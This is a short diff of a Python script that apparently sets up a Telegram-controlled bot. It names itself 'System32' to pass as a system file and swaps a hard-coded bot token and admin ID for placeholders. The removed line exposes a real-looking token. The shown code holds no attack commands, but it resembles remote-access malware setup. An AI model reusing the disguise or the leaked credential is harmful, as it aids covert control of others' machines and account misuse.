@@ -39,8 +39,8 @@ from subprocess import Popen, PIPE
 fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
 #Токен/Айди
-token = '1234526486:AAGhBdDUBc9M8XsuJCe7VUrbLXftBdC54cE'
-adm = '643200553'
+token = 'Токен'
+adm = 'Айди'
 
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=30)
